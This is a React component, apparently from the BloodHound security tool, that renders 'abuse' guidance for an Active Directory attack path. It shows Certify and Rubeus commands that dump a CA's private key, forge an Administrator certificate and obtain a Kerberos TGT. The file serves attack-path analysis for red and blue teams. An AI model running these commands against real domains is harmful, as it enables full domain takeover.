// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Typography } from '@mui/material';
import { FC } from 'react';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body1'>
                Obtain CA certificate incl. private key
            </Typography>
            <Typography variant='body2'>
                Use Certify (2.0) to export all certificates in the local machine certificate store and identify the CA certificate by the name of the CA:
                <Typography component={'pre'}>{'Certify.exe manage-self --dump-certs'}</Typography>
            </Typography>
            <Typography variant='body1'>Forge certificate and obtain a TGT as targeted principal</Typography>
            <Typography variant='body2'>
                Forge a certificate of a target principal:
                <Typography component={'pre'}>
                    {
                        'Certify.exe forge --ca-cert <pfx-path/base64-pfx> --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500'
                    }
                </Typography>
                <br />
                Request a TGT for the targeted principal using the certificate with Rubeus:
                <Typography component={'pre'}>
                    {
                        'Rubeus.exe asktgt /user:Administrator /domain:dumpster.fire /certificate:<pfx-path/base64-pfx>'
                    }
                </Typography>
            </Typography>
        </>
    );
};

export default Abuse;
